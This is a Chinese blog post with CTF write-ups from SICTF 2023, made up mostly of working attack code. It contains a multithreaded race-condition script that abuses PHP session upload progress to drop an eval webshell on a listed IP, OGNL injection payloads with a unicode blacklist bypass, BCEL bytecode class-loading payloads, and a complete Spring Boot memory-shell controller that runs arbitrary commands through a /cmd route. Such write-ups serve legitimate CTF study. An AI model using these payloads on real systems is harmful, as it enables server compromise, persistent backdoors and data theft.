<h3 id="我全都要（拿了个二血）"><a href="#我全都要（拿了个二血）" class="headerlink" title="我全都要（拿了个二血）"></a>我全都要（拿了个二血）</h3><p>pop链不说了</p>
<h3 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h3><p>当时看到传不上去就想着条件竞争，但是不会操作</p>
<p>我印象中的竞争有session条件竞争，然后就是多线程</p>
<p>看了unknow师傅的wp，可以使用session的脚本</p>
<p>偷师傅的脚本</p>
<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span>
<span class="hljs-comment"># Author：Y4tacker</span>
<span class="hljs-keyword">import</span> io
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> threading

sessid = <span class="hljs-string">&#x27;yyy&#x27;</span>
url = <span class="hljs-string">&quot;http://210.44.151.51:10418/upload.php&quot;</span>
<span class="hljs-comment">##这里小改了一下</span>
php = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">&lt;?php</span>
<span class="hljs-string">file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php eval($_GET[&quot;c&quot;]);?&gt;&#x27;);</span>
<span class="hljs-string">echo &#x27;bingo&#x27;;&#x27;&#x27;&#x27;</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        f = php
        resp = session.post(url,
                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">f&quot;123123213123&quot;</span>&#125;,
                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.php&#x27;</span>, f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        resp = session.get(<span class="hljs-string">&#x27;http://210.44.151.51:10418/uploads/1.php&#x27;</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;bingo&quot;</span> <span class="hljs-keyword">in</span> resp.text:
            <span class="hljs-built_in">print</span>(resp.text)
            <span class="hljs-keyword">break</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    event = threading.Event()
    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:

        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):
            threading.Thread(target=write, args=(session,)).start()

        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):
            threading.Thread(target=read, args=(session,)).start()

    event.<span class="hljs-built_in">set</span>()
</code></pre></div>

<p><img src="/2023/09/10/sictf2023/image-20230910214204467.png" srcset="/img/loading.gif" lazyload alt="image-20230910214204467"></p>
<h3 id="pain-（看了四种解法）"><a href="#pain-（看了四种解法）" class="headerlink" title="pain （看了四种解法）"></a>pain （看了四种解法）</h3><p>考察OGNL表达式</p>
<p>正常的命令执行是下面这样</p>
<div class="code-wrapper"><pre><code class="hljs reasonml">OgnlContext context = <span class="hljs-keyword">new</span> <span class="hljs-constructor">OgnlContext()</span>;
<span class="hljs-comment">//context.setRoot(test);</span>

<span class="hljs-comment">//表达式</span>
String express = <span class="hljs-string">&quot;(#a=@java.lang.Runtime@getRuntime.exec(&#x27;calc&#x27;)&quot;</span>;
<span class="hljs-comment">//(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span>

Object ognl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>parse<span class="hljs-constructor">Expression(<span class="hljs-params">express</span>)</span>;
Object value = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>get<span class="hljs-constructor">Value(<span class="hljs-params">ognl</span>,<span class="hljs-params">context</span>,<span class="hljs-params">context</span>.<span class="hljs-params">getRoot</span>()</span>);
<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(value);</code></pre></div>

<p>题目黑名单</p>
<p><img src="/image-20230911153225651.png" srcset="/img/loading.gif" lazyload alt="image-20230911153225651"></p>
<h4 id="unicode绕过"><a href="#unicode绕过" class="headerlink" title="unicode绕过"></a>unicode绕过</h4><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@java</span>.lang.\u0052untime<span class="hljs-variable">@g</span>\u0065t\<span class="hljs-built_in">u0052untime</span>().\<span class="hljs-built_in">u0065xec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div>

<p>记得url编码（我当时想的就是unicode，但没url编码网页报错400不知道咋办了）</p>
<h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><div class="code-wrapper"><pre><code class="hljs clojure">(<span class="hljs-name">#a=new</span> java.util.Scanner(<span class="hljs-name"><span class="hljs-built_in">new</span></span> java.io.File(<span class="hljs-string">&quot;/flag&quot;</span>)).next())</code></pre></div>

<p>妙妙妙妙啊</p>
<h4 id="bcel字节码（unknow师傅的解法）"><a href="#bcel字节码（unknow师傅的解法）" class="headerlink" title="bcel字节码（unknow师傅的解法）"></a>bcel字节码（unknow师傅的解法）</h4><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;
<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;
<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;
<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.JavaWrapper;

<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> App &#123;
    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main( String[] args ) throws <span class="hljs-keyword">Exception</span>&#123;
        //第一种触发方式
        //JavaClass javaClass = Repository.lookupClass(Evil.<span class="hljs-keyword">class</span>);
        //
        //String encode = Utility.encode(javaClass.getBytes(), <span class="hljs-keyword">true</span>);
        //
        //<span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(encode);
        //<span class="hljs-built_in">new</span> ClassLoader().loadClass(&quot;$$BCEL$$&quot;+encode).newInstance();

        //第二种触发方式
        JavaClass javaClass = Repository.lookupClass(Evil.<span class="hljs-keyword">class</span>);
        String encode = Utility.encode(javaClass.getBytes(), <span class="hljs-keyword">true</span>);
        JavaWrapper._main(<span class="hljs-built_in">new</span> String[]&#123;&quot;$$BCEL$$&quot;+encode&#125;);
        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;$$BCEL$$&quot;+encode);

    &#125;
&#125;</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-comment">//Evil.java</span>
<span class="hljs-keyword">import</span> java.<span class="hljs-property">io</span>.<span class="hljs-property">IOException</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;

    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">_main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>);
        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) &#123;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
        &#125;
    &#125;
&#125;
</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-comment">//使用第一种方法的Evil.java</span>
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;
    <span class="hljs-keyword">static</span> &#123;
        <span class="hljs-keyword">try</span> &#123;
            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);
        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">RuntimeException</span>(e);
        &#125;
    &#125;
&#125;</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs reasonml">public static void main( String<span class="hljs-literal">[]</span> args ) throws Exception&#123;

    JavaClass javaClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(Evil.<span class="hljs-params">class</span>)</span>;
    String encode = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(javaClass.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);
    String bcel = <span class="hljs-string">&quot;$$BCEL$$&quot;</span>+encode;

    String code = <span class="hljs-string">&quot;@com.sun.org.apache.bcel.internal.util.JavaWrapper@_main(&#123;&#x27;&quot;</span>+bcel+<span class="hljs-string">&quot;&#x27;&#125;.toArray())&quot;</span>;

    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLEncode</span>.</span></span>encode(code)); 

    OgnlContext context = <span class="hljs-keyword">new</span> <span class="hljs-constructor">OgnlContext()</span>;

    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>get<span class="hljs-constructor">Value(<span class="hljs-params">code</span>, <span class="hljs-params">context</span>, <span class="hljs-params">context</span>.<span class="hljs-params">getRoot</span>()</span>);

&#125;</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs dart">#使用ClassLoader

(#a=<span class="hljs-keyword">new</span> com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(<span class="hljs-string">&#x27;$<span class="hljs-subst">$BCEL</span>$$<span class="hljs-subst">$l</span><span class="hljs-subst">$8b</span><span class="hljs-subst">$I</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span><span class="hljs-subst">$AmRKO</span><span class="hljs-subst">$c2</span><span class="hljs-subst">$40</span><span class="hljs-subst">$Q</span><span class="hljs-subst">$fe</span><span class="hljs-subst">$W</span><span class="hljs-subst">$90BmEQ</span><span class="hljs-subst">$f0</span><span class="hljs-subst">$fd</span><span class="hljs-subst">$7e</span><span class="hljs-subst">$81</span><span class="hljs-subst">$H</span><span class="hljs-subst">$b9x</span><span class="hljs-subst">$c3x1</span><span class="hljs-subst">$9a</span><span class="hljs-subst">$Y</span><span class="hljs-subst">$eb</span><span class="hljs-subst">$pb0</span><span class="hljs-subst">$k</span><span class="hljs-subst">$cb</span><span class="hljs-subst">$ba</span><span class="hljs-subst">$c2bmM</span><span class="hljs-subst">$v</span><span class="hljs-subst">$ea</span><span class="hljs-subst">$3f</span><span class="hljs-subst">$f2</span><span class="hljs-subst">$ecE</span><span class="hljs-subst">$8d</span><span class="hljs-subst">$sz</span><span class="hljs-subst">$f7G</span><span class="hljs-subst">$ZgWE</span><span class="hljs-subst">$S</span><span class="hljs-subst">$eda</span><span class="hljs-subst">$a63</span><span class="hljs-subst">$dfcf</span><span class="hljs-subst">$db</span><span class="hljs-subst">$7d</span><span class="hljs-subst">$ffx</span><span class="hljs-subst">$7e</span><span class="hljs-subst">$F</span><span class="hljs-subst">$b0</span><span class="hljs-subst">$86</span><span class="hljs-subst">$82</span><span class="hljs-subst">$894FL</span><span class="hljs-subst">$8cb</span><span class="hljs-subst">$y</span><span class="hljs-subst">$85q</span><span class="hljs-subst">$95</span><span class="hljs-subst">$t</span><span class="hljs-subst">$ML</span><span class="hljs-subst">$g</span><span class="hljs-subst">$982</span><span class="hljs-subst">$91</span><span class="hljs-subst">$c4</span><span class="hljs-subst">$b4</span><span class="hljs-subst">$81</span><span class="hljs-subst">$Z</span><span class="hljs-subst">$D</span><span class="hljs-subst">$b3</span><span class="hljs-subst">$M</span><span class="hljs-subst">$c9u</span><span class="hljs-subst">$e9</span><span class="hljs-subst">$cbh</span><span class="hljs-subst">$83</span><span class="hljs-subst">$n</span><span class="hljs-subst">$5e</span><span class="hljs-subst">$uV</span><span class="hljs-subst">$Z</span><span class="hljs-subst">$S</span><span class="hljs-subst">$9b</span><span class="hljs-subst">$c1</span><span class="hljs-subst">$99</span><span class="hljs-subst">$60</span><span class="hljs-subst">$c88</span><span class="hljs-subst">$d2</span><span class="hljs-subst">$X</span><span class="hljs-subst">$fb</span><span class="hljs-subst">$ed</span><span class="hljs-subst">$cb</span><span class="hljs-subst">$9a</span><span class="hljs-subst">$I</span><span class="hljs-subst">$8f</span><span class="hljs-subst">$dd</span><span class="hljs-subst">$9aG</span><span class="hljs-subst">$9d</span><span class="hljs-subst">$ac</span><span class="hljs-subst">$Tp</span><span class="hljs-subst">$d7</span><span class="hljs-subst">$ab</span><span class="hljs-subst">$ba</span><span class="hljs-subst">$a1T</span><span class="hljs-subst">$f5w3</span><span class="hljs-subst">$R5d</span><span class="hljs-subst">$8b</span><span class="hljs-subst">$3c</span><span class="hljs-subst">$9c</span><span class="hljs-subst">$adk</span><span class="hljs-subst">$e9</span><span class="hljs-subst">$95</span><span class="hljs-subst">$ZR</span><span class="hljs-subst">$eb</span><span class="hljs-subst">$dc</span><span class="hljs-subst">$fb</span><span class="hljs-subst">$b6c</span><span class="hljs-subst">$E</span><span class="hljs-subst">$e7</span><span class="hljs-subst">$9c</span><span class="hljs-subst">$a6</span><span class="hljs-subst">$7b</span><span class="hljs-subst">$ed</span><span class="hljs-subst">$96dP</span><span class="hljs-subst">$da9</span><span class="hljs-subst">$d8</span><span class="hljs-subst">$ba</span><span class="hljs-subst">$e5</span><span class="hljs-subst">$e2</span><span class="hljs-subst">$w</span><span class="hljs-subst">$92</span><span class="hljs-subst">$81O4</span><span class="hljs-subst">$bb</span><span class="hljs-subst">$S</span><span class="hljs-subst">$b9</span><span class="hljs-subst">$fcb</span><span class="hljs-subst">$cf</span><span class="hljs-subst">$bd</span><span class="hljs-subst">$d26</span><span class="hljs-subst">$b4</span><span class="hljs-subst">$U</span><span class="hljs-subst">$83Y</span><span class="hljs-subst">$J</span><span class="hljs-subst">$da</span><span class="hljs-subst">$n</span><span class="hljs-subst">$X</span><span class="hljs-subst">$dbR</span><span class="hljs-subst">$d9</span><span class="hljs-subst">$a6</span><span class="hljs-subst">$95</span><span class="hljs-subst">$dd</span><span class="hljs-subst">$aa</span><span class="hljs-subst">$d2Z0</span><span class="hljs-subst">$d1k</span><span class="hljs-subst">$60</span><span class="hljs-subst">$ce</span><span class="hljs-subst">$c2</span><span class="hljs-subst">$3c</span><span class="hljs-subst">$Wh</span><span class="hljs-subst">$k</span><span class="hljs-subst">$ad</span><span class="hljs-subst">$c0</span><span class="hljs-subst">$z</span><span class="hljs-subst">$yb</span><span class="hljs-subst">$89a</span><span class="hljs-subst">$f0</span><span class="hljs-subst">$lo</span><span class="hljs-subst">$861</span><span class="hljs-subst">$dd</span><span class="hljs-subst">$f5</span><span class="hljs-subst">$5c</span><span class="hljs-subst">$bf</span><span class="hljs-subst">$5e</span><span class="hljs-subst">$3aj</span><span class="hljs-subst">$fb</span><span class="hljs-subst">$91</span><span class="hljs-subst">$bc</span><span class="hljs-subst">$U</span><span class="hljs-subst">$jPy</span><span class="hljs-subst">$z</span><span class="hljs-subst">$93</span><span class="hljs-subst">$872g</span><span class="hljs-subst">$e8</span><span class="hljs-subst">$ff</span><span class="hljs-subst">$r</span><span class="hljs-subst">$k</span><span class="hljs-subst">$d4</span><span class="hljs-subst">$9a</span><span class="hljs-subst">$82G</span><span class="hljs-subst">$M</span><span class="hljs-subst">$D</span><span class="hljs-subst">$7f</span><span class="hljs-subst">$b4</span><span class="hljs-subst">$b4W</span><span class="hljs-subst">$5dD</span><span class="hljs-subst">$9d</span><span class="hljs-subst">$oW</span><span class="hljs-subst">$u</span><span class="hljs-subst">$3a</span><span class="hljs-subst">$7f8t</span><span class="hljs-subst">$9e</span><span class="hljs-subst">$84</span><span class="hljs-subst">$b8</span><span class="hljs-subst">$V</span><span class="hljs-subst">$9ca</span><span class="hljs-subst">$b9</span><span class="hljs-subst">$d0</span><span class="hljs-subst">$85V</span><span class="hljs-subst">$a2P</span><span class="hljs-subst">$fa</span><span class="hljs-subst">$f5r</span><span class="hljs-subst">$b7</span><span class="hljs-subst">$e00</span><span class="hljs-subst">$M</span><span class="hljs-subst">$b8h</span><span class="hljs-subst">$b5H0</span><span class="hljs-subst">$d2</span><span class="hljs-subst">$cd</span><span class="hljs-subst">$3cn</span><span class="hljs-subst">$84</span><span class="hljs-subst">$c1</span><span class="hljs-subst">$8d</span><span class="hljs-subst">$fa</span><span class="hljs-subst">$Q</span><span class="hljs-subst">$e5b</span><span class="hljs-subst">$V</span><span class="hljs-subst">$b3H</span><span class="hljs-subst">$d1_SO</span><span class="hljs-subst">$ML</span><span class="hljs-subst">$j</span><span class="hljs-subst">$9e</span><span class="hljs-subst">$a2EU</span><span class="hljs-subst">$892</span><span class="hljs-subst">$a3</span><span class="hljs-subst">$dc</span><span class="hljs-subst">$b3</span><span class="hljs-subst">$f2</span><span class="hljs-subst">$Iv</span><span class="hljs-subst">$afa</span><span class="hljs-subst">$9bbR7</span><span class="hljs-subst">$N</span><span class="hljs-subst">$f4Q</span><span class="hljs-subst">$b4</span><span class="hljs-subst">$be</span><span class="hljs-subst">$I</span><span class="hljs-subst">$c8</span><span class="hljs-subst">$a0</span><span class="hljs-subst">$9fr</span><span class="hljs-subst">$K</span><span class="hljs-subst">$D</span><span class="hljs-subst">$j</span><span class="hljs-subst">$f19</span><span class="hljs-subst">$e2</span><span class="hljs-subst">$g</span><span class="hljs-subst">$h</span><span class="hljs-subst">$7eB</span><span class="hljs-subst">$y</span><span class="hljs-subst">$h</span><span class="hljs-subst">$7f</span><span class="hljs-subst">$40</span><span class="hljs-subst">$e2</span><span class="hljs-subst">$e4</span><span class="hljs-subst">$O</span><span class="hljs-subst">$f6</span><span class="hljs-subst">$ee</span><span class="hljs-subst">$L</span><span class="hljs-subst">$92</span><span class="hljs-subst">$a7</span><span class="hljs-subst">$e4f</span><span class="hljs-subst">$bc</span><span class="hljs-subst">$ddk0M</span><span class="hljs-subst">$d4</span><span class="hljs-subst">$k</span><span class="hljs-subst">$o</span><span class="hljs-subst">$w</span><span class="hljs-subst">$db</span><span class="hljs-subst">$3c</span><span class="hljs-subst">$bd</span><span class="hljs-subst">$B</span><span class="hljs-subst">$ea</span><span class="hljs-subst">$fe</span><span class="hljs-subst">$d8</span><span class="hljs-subst">$d4</span><span class="hljs-subst">$ed</span><span class="hljs-subst">$d51OC</span><span class="hljs-subst">$7e</span><span class="hljs-subst">$c6</span><span class="hljs-subst">$d8</span><span class="hljs-subst">$84d1H</span><span class="hljs-subst">$d5</span><span class="hljs-subst">$90</span><span class="hljs-subst">$k</span><span class="hljs-subst">$ls</span><span class="hljs-subst">$M</span><span class="hljs-subst">$e4</span><span class="hljs-subst">$d2</span><span class="hljs-subst">$E</span><span class="hljs-subst">$e4</span><span class="hljs-subst">$f5f</span><span class="hljs-subst">$c3</span><span class="hljs-subst">$9f</span><span class="hljs-subst">$9e</span><span class="hljs-subst">$b2</span><span class="hljs-subst">$c5O</span><span class="hljs-subst">$84</span><span class="hljs-subst">$C</span><span class="hljs-subst">$A</span><span class="hljs-subst">$A</span>&#x27;</span>)).newInstance()</code></pre></div>

<p>本地自建的Evil.java，带不带包名都可以，都打得通。（保险起见还是带上吧）</p>
<h3 id="DoyouknowCC-（不会，先欠着）"><a href="#DoyouknowCC-（不会，先欠着）" class="headerlink" title="DoyouknowCC （不会，先欠着）"></a>DoyouknowCC （不会，先欠着）</h3><p>springboot &gt;2.6内存马</p>
<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.controller;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
<span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;
<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;
<span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.lang.reflect.Method;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilController</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, NoSuchMethodException, IllegalAccessException &#123;
        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class="hljs-number">0</span>);
        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);
        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> EvilController.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);
        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);
        field.setAccessible(<span class="hljs-literal">true</span>);
        RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) field.get(mappingHandlerMapping);
        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/cmd&quot;</span>).options(config).build();
        <span class="hljs-type">EvilController</span> <span class="hljs-variable">springBootMemoryShellOfController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EvilController</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>);
        mappingHandlerMapping.registerMapping(info,springBootMemoryShellOfController,method);
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilController</span><span class="hljs-params">(String test)</span>&#123;

    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;
        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getRequest();
        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getResponse();
        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);
        <span class="hljs-keyword">if</span> (command!=<span class="hljs-literal">null</span>)&#123;
            <span class="hljs-keyword">try</span> &#123;
                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> response.getWriter();
                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;
                ProcessBuilder p;
                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;
                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, command&#125;);
                &#125; <span class="hljs-keyword">else</span> &#123;
                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command&#125;);
                &#125;
                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);
                o = c.hasNext() ? c.next() : o;
                c.close();
                printWriter.write(o);
                printWriter.flush();
                printWriter.close();
            &#125;<span class="hljs-keyword">catch</span> (Exception ignored)&#123;

            &#125;

        &#125;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;

    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;

    &#125;
&#125;

</code></pre></div>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>sictf2023</div>
      <div>https://zer0peach.github.io/2023/09/10/sictf2023/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Zer0peach</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年9月10日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/" title="java基础和springboot">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">java基础和springboot</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/09/10/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/" title="羊城杯2023">
                        <span class="hidden-mobile">羊城杯2023</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
